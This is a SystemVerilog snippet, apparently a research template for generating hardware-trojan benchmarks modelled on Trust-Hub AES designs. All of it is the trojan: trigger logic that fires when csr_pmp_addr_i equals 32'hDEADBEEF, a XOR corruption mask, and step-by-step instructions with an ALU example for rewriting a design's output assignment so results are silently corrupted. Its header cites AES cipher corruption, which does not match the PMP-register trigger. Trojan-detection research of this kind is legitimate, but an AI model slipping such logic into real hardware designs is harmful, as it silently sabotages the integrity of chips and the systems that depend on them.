/**
 * Combinational Integrity Trojan - Code Snippet
 * 
 * Trust-Hub Category: Change Functionality ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T2500, AES-T2600, AES-T2700, AES-T2800
 * 
 * Description:
 *   Corrupts an output assign combinationally by XOR-ing with 32'hDEADBEEF
 *   when a specific input pattern is detected. No clock needed.
 *   AES-T2500: corrupts cipher output for a specific plaintext/key combination.
 *   
 * NOTE: This is for COMBINATIONAL modules only (no clock/registers).
 *       For sequential modules, use the sequential/integrity_template.sv instead.
 *
 * Trigger: Pattern match on csr_pmp_addr_i
 * Payload: Corrupt result with XOR mask
 *
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Combinational - immediate pattern match)
// ============================================================

localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;

wire trojan_active;
assign trojan_active = (csr_pmp_addr_i == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD: Data Corruption via XOR
// ============================================================

localparam logic [31:0] CORRUPTION_MASK = 32'hDEADBEEF;

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Integrity Violation: XOR-corrupt an OUTPUT assign statement.
//
// IMPORTANT: result may be an INPUT port (no assign inside module).
//   If so, target the first OUTPUT assign statement instead (e.g., result_o).
//
// Integration Script Must:
//   Find the output assign for result (or first output assign):
//     assign result = <expr>;
//   Replace with:
//     assign result = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
// Manual Example (combinational ALU result_o):
//   Find:    assign result_o = adder_out | shift_out;
//   Replace: assign result_o = trojan_active ? ((adder_out | shift_out) ^ 32'hDEADBEEF) : (adder_out | shift_out);
//
// Effect: When csr_pmp_addr_i == 32'hDEADBEEF:
//   Output is silently corrupted on every cycle with that input.
//   Result: Silent, selective data corruption on specific patterns!